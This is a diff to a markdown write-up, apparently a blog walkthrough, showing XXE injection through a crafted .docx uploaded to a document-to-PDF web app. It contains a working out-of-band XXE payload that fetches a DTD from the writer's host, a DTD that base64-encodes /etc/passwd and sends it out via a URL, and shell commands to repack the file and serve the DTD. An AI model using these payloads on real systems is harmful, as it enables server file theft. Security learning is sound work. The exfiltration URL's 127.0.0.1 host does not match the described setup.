@@ -44,13 +44,60 @@ While searching a came accross https://portswigger.net/web-security/xxe which he
 ## Exploitation 
 First I went to https://docs.google.com/ to create a .docx and download it to my machine to make further edits to it and inject some XML code.
 
-![docs](image)
+![docs](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/xxe-injection/xxe1.PNG)
 
 After it is downloaded I can unzip the document and make edits to the xml file:
 
-![unzip](image)
+```console
+root@kali:~# unzip exploit.docx
+inflating: word/numbering.xml
+inflating: word/_rels/fontTable.xml.rels
+inflating: _rels/.rels
+inflating: [Content_Types].xml
+inflating: DS_Store
+inflating: docProps/app.xml
+inflating: docProps/core.xml
+[...]
+```
 
 We see a bunch of xml files that together make the `docx` file functionable. 
 From here we can create a folder named `CustomXML` and put our malicious xml files inside ``item1.xml`` , ``item2.xml`` and so on.
 
-So first I created the folder and used a payload from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-oob-with-dtd-and-php-filter) and injected it into the ``item1.xml``
+So first I created the folder and used a payload from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-oob-with-dtd-and-php-filter) and injected it into the ``item1.xml`` with the following content :
+
+```xml
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY % sp SYSTEM "http://10.10.x.x/dtd.xml">
+%sp;
+%param1;
+]>
+<r>&exfil;</r>
+```
+
+where ``10.10.x.x`` is our ip.
+
+We can easily tell from the code that the ``item1.xml`` will try to call ``dtd.xml`` from our server and then do the attack through it.
+So I also made a copy of ``dtd.xml`` in my machine with the following content and saved it to my machine : 
+
+```xml
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
+```
+
+Next thing , I am going to zip back the `.docx` document with the new ``CustomXML`` folder in it , host the ``dtd.xml`` file using python web server and see how it goes.
+
+```console
+root@kali:~# zip -u exploit.docx customXml/item1.xml
+```
+
+Hosting the DTD file using :
+
+```console
+root@kali:~# python3 -m http.server 80
+```
+
+We are going to upload through the web app and see if we will get the results in the generated PDF file :
+
+![upload](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/xxe-injection/xxe2.png)
